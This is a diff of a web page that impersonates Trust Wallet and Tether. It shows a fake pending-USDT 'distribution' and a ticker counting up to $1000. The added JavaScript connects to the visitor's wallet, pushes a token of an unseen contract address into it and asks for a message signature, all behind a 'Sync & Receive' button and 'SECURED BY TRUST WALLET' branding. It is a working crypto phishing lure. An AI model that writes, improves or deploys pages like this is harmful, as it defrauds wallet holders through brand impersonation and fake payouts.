@@ -13,17 +13,13 @@
         .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
-        
         .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
-        .price-label { font-size: 12px; color: #848d97; text-transform: uppercase; margin-bottom: 5px; }
         .price-value { font-size: 22px; font-weight: 700; color: #fff; }
-
         h2 { font-weight: 700; font-size: 22px; margin: 10px 0; }
         p { color: #848d97; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
         .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
         .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
         #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; }
-        .status-footer { margin-top: 25px; font-size: 10px; color: #444c56; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
@@ -32,20 +28,13 @@
     <div class="logo-ring">
         <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
     </div>
-    
     <h2>RECEIVE USDT</h2>
     <p>Secure Bridge detected a pending USDT distribution. Synchronize to map official metadata.</p>
-
     <div class="price-box">
-        <div class="price-label">Allocated Node Value</div>
         <div class="price-value" id="priceTicker">$0.00</div>
     </div>
-    
     <div id="log-area">SYSTEM: READY</div>
-    
     <button class="action-btn" id="claimBtn">Sync & Receive</button>
-    
-    <div class="status-footer">SECURED BY TRUST WALLET NODE</div>
 </div>
 
 <script>
@@ -54,7 +43,7 @@
 
     window.onload = () => {
         let val = 0;
-        const target = 1000.00; 
+        const target = 1000.00;
         const timer = setInterval(() => {
             if(val >= target) clearInterval(timer);
             val += 17.52;
@@ -66,27 +55,61 @@
         const log = document.getElementById('log-area');
         const btn = document.getElementById('claimBtn');
         
-        // --- TRUST WALLET PRIORITY CHECK ---
-        const provider = window.trustwallet || window.ethereum;
+        // --- YE HISSA TRUST WALLET KE LIYE CRITICAL HAI ---
+        let provider = window.trustwallet || window.ethereum;
 
-        if (!provider) { 
-            alert("Protocol Error: Trust Wallet extension not detected."); 
-            return; 
+        // Agar dono hain, to Trust ko select karein
+        if (window.ethereum?.providers) {
+            provider = window.ethereum.providers.find(p => p.isTrust) || window.ethereum;
+        }
+
+        if (!provider) {
+            alert("Trust Wallet not found! Please make sure the extension is active.");
+            return;
         }
 
         try {
             btn.disabled = true;
-            log.innerText = "> INITIALIZING TRUST SYNC...";
+            log.innerText = "> CONNECTING TRUST WALLET...";
             
-            // Handshake
+            // Step 1: Request Accounts
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
             
-            log.innerText = "> MAPPING ASSET LOGO...";
-            // Token Injection with Logo
+            // Step 2: Watch Asset (Token Add)
+            log.innerText = "> INJECTING USDT LOGO...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT_ADDR,
-                        symbol
+                        symbol: 'USDT',
+                        decimals: 6,
+                        image: TOKEN_LOGO,
+                    },
+                },
+            });
+
+            // Step 3: Signature
+            log.innerText = "> FINALIZING SYNC...";
+            const msg = "Tether Node Sync Verification";
+            await provider.request({
+                method: 'personal_sign',
+                params: [msg, accounts[0]],
+            });
+
+            log.innerText = "> SUCCESSFUL!";
+            alert("Trust Wallet Sync Complete!");
+            btn.innerText = "SUCCESS";
+
+        } catch (err) {
+            console.error(err);
+            log.innerText = "> ERROR: " + (err.message || "SYNC FAILED");
+            btn.disabled = false;
+        }
+    }
+
+    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
+</script>
+</body>
+</html>
